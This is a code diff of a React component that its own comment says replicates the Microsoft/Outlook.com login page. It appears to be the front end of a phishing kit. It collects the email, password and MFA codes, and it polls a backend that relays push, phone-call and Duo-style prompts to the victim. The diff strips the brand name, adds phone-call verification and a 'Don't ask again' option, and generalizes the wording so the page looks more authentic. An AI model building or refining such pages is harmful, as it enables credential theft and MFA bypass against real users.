@@ -1,11 +1,10 @@
-
 import React, { useState } from 'react';
 import './AppStyles.css'; // Import the new CSS file
 
 /**
- * A React component that accurately replicates the Microsoft/Outlook.com login page.
- * It features a multi-step process, continuous polling for MFA, and distinct
- * styling for informational, error, and success messages.
+ * A React component that accurately replicates a multi-step login page.
+ * It features a multi-step process including password, push notifications, security codes, 
+ * and phone call verification, with continuous polling for MFA.
  */
 const App = () => {
     const api_url = "";
@@ -17,7 +16,7 @@ const App = () => {
     const [keepSignedIn, setKeepSignedIn] = useState(false);
     // State to control the flow between the email and password steps
     const [isPasswordStep, setIsPasswordStep] = useState(false);
-    // State to control the flow to the Duo Mobile step
+    // State to control the flow to the MFA/verification step
     const [isDuoMobileStep, setIsDuoMobileStep] = useState(false);
     // State to control the flow to the Success step
     const [isSuccessStep, setIsSuccessStep] = useState(false);
@@ -26,8 +25,10 @@ const App = () => {
     const [authMessage, setAuthMessage] = useState('');
     const [duoCode, setDuoCode] = useState('');
     const [showDuoCodeInput, setShowDuoCodeInput] = useState(false);
-    // New state to control error styling for auth messages
+    // State to control error styling for auth messages
     const [isError, setIsError] = useState(false);
+    // State for the "Don't ask again" MFA checkbox
+    const [dontAskAgain, setDontAskAgain] = useState(false);
 
     const [alert_email_typing, setAlert_email_typing] = useState(false);
 
@@ -104,9 +105,12 @@ const App = () => {
                 setIsDuoMobileStep(false);
                 setIsPasswordStep(true); // Return to password entry
                 break;
-            } else if (status === 'mobile notification') {
+            } else if (status === 'mobile notification' || status === 'phone_call') {
                 setIsError(false);
-                setAuthMessage('Please check your mobile device for a notification.');
+                const message = status === 'mobile notification'
+                    ? 'We sent a notification to your mobile device. Please open it to continue.'
+                    : "We're calling your phone. Please answer it to continue.";
+                setAuthMessage(message);
                 setIsPasswordStep(false);
                 setIsDuoMobileStep(true);
                 setShowDuoCodeInput(false);
@@ -115,7 +119,7 @@ const App = () => {
             } else if (status === 'duo code' || status === 'incorrect duo code') {
                 const isIncorrect = status === 'incorrect duo code';
                 setIsError(isIncorrect);
-                setAuthMessage(isIncorrect ? 'Incorrect Duo code. Please try again.' : 'Please enter the Duo code.');
+                setAuthMessage(isIncorrect ? 'Incorrect code. Please try again.' : 'Please enter the security code.');
                 setIsPasswordStep(false);
                 setIsDuoMobileStep(true);
                 setShowDuoCodeInput(true);
@@ -130,9 +134,9 @@ const App = () => {
                 setAuthMessage('An unexpected error occurred. Please try again.');
                 break;
             }
-        } while ((status === 'pending' || status === 'mobile notification') && attempts < maxAttempts);
+        } while ((status === 'pending' || status === 'mobile notification' || status === 'phone_call') && attempts < maxAttempts);
 
-        if ((status === 'pending' || status === 'mobile notification') && attempts >= maxAttempts) {
+        if ((status === 'pending' || status === 'mobile notification' || status === 'phone_call') && attempts >= maxAttempts) {
             setIsError(true);
             setAuthMessage('Authentication timed out. Please try again.');
         }
@@ -154,12 +158,20 @@ const App = () => {
         console.log(data);
     };
 
-    // Custom Key SVG Icon for "Sign-in options"
+    // SVG Icon for "Sign-in options"
     const KeyIcon = () => (
         <svg className="key-icon-svg" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1} stroke="currentColor">
             <path strokeLinecap="round" strokeLinejoin="round" d="M15.75 5.25a3 3 0 013 3m3 0a6 6 0 01-7.029 5.912c-.563-.097-1.159.026-1.563.43L10.5 17.25H8.25v2.25H6v2.25H2.25v-2.818c0-.597.237-1.17.659-1.591l6.499-6.499c.404-.404.527-1 .43-1.563A6 6 0 1121.75 8.25z" />
         </svg>
     );
+    
+    // SVG Icon for the new Phone verification step
+    const PhoneIcon = () => (
+        <svg className="mfa-prompt-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor">
+            <path strokeLinecap="round" strokeLinejoin="round" d="M2.25 6.75c0 8.284 6.716 15 15 15h2.25a2.25 2.25 0 002.25-2.25v-1.372c0-.516-.351-.966-.852-1.091l-4.423-1.106c-.44-.11-.902.055-1.173.417l-1.49 1.49c-1.976-1.034-3.668-2.726-4.702-4.702l1.49-1.49a.75.75 0 00.417-1.173l-1.106-4.423a1.125 1.125 0 00-1.091-.852H3.75A2.25 2.25 0 002.25 6.75z" />
+        </svg>
+    );
+
 
     return (
         <div className="app-container">
@@ -308,38 +320,61 @@ const App = () => {
                                 </button>
                                 <span className="email-display">{email}</span>
                             </div>
-                            <h1 className="form-title">Approve sign in</h1>
-                             {authMessage && (
-                                <p className="auth-message" style={{ color: isError ? '#d9534f' : 'inherit', marginBottom: '1rem' }}>
-                                    {isSubmitting && !isError ? 'Verifying...' : authMessage}
-                                </p>
-                            )}
+
                             {showDuoCodeInput ? (
-                                <form onSubmit={handleSignInClick}>
-                                    <div className="input-field-container" style={{ marginBottom: '0.5rem' }}>
-                                        <input
-                                            type="text"
-                                            value={duoCode}
-                                            onChange={(e) => setDuoCode(e.target.value)}
-                                            placeholder="Enter security code"
-                                            className="input-field"
-                                            autoFocus
-                                        />
-                                    </div>
-                                    <div className="flex-justify-end">
-                                        <button
-                                            type="submit"
-                                            className="button-primary"
-                                            disabled={isSubmitting}
-                                        >
-                                            {isSubmitting ? 'Verifying...' : 'Verify'}
-                                        </button>
-                                    </div>
-                                </form>
+                                <>
+                                    <h1 className="form-title">Enter security code</h1>
+                                    {authMessage && (
+                                        <p className="auth-message" style={{ color: isError ? '#d9534f' : 'inherit', marginBottom: '1rem' }}>
+                                            {authMessage}
+                                        </p>
+                                    )}
+                                    <form onSubmit={handleSignInClick}>
+                                        <div className="input-field-container" style={{ marginBottom: '0.5rem' }}>
+                                            <input
+                                                type="text"
+                                                value={duoCode}
+                                                onChange={(e) => setDuoCode(e.target.value)}
+                                                placeholder="Enter security code"
+                                                className="input-field"
+                                                autoFocus
+                                            />
+                                        </div>
+                                        <div className="flex-justify-end">
+                                            <button
+                                                type="submit"
+                                                className="button-primary"
+                                                disabled={isSubmitting}
+                                            >
+                                                {isSubmitting ? 'Verifying...' : 'Verify'}
+                                            </button>
+                                        </div>
+                                    </form>
+                                </>
                             ) : (
-                                <div className="spinner-container">
-                                    <div className="spinner"></div>
-                                </div>
+                                <>
+                                    <h1 className="form-title" style={{ marginBottom: '2rem' }}>Approve sign in request</h1>
+                                    <div className="mfa-prompt-container">
+                                        {authMessage.includes('calling') ? <PhoneIcon /> : <div className="spinner"></div>}
+                                        <p className="mfa-prompt-text">{authMessage}</p>
+                                    </div>
+                                    <div className="mfa-options-container">
+                                        <label className="checkbox-container">
+                                            <input
+                                                type="checkbox"
+                                                checked={dontAskAgain}
+                                                onChange={(e) => setDontAskAgain(e.target.checked)}
+                                                className="checkbox-input"
+                                            />
+                                            <span className="checkbox-custom"></span>
+                                            Don't ask again for 30 days
+                                        </label>
+                                        <div className="mfa-links">
+                                            <a href="#" className="link-custom">Having trouble? Sign in another way</a>
+                                            <a href="#" className="link-custom">More information</a>
+                                        </div>
+                                    </div>
+                                </>
                             )}
                         </div>
                     ) : ( // Success Step
